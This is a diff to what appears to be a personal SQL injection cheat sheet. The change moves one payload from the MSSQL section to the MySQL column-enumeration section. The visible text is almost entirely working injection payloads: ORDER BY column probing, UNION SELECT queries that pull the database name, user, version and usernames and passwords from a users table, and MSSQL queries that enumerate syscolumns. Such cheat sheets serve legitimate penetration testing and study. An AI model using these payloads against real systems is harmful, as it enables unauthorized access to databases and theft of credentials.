@@ -321,13 +321,13 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 # colum
 ' ORDER BY 1-- //
+' or 1=1 order by 6 #
 ' UNION SELECT database(), user(), @@version, null, null -- //
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 ### MSSQL
 #### Inject
 ```
-' or 1=1 order by 6 #
 test' union select 1,@@version,3,4,5,6--
 test' union select 1,DB_NAME(),3,4,5,6--
 test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
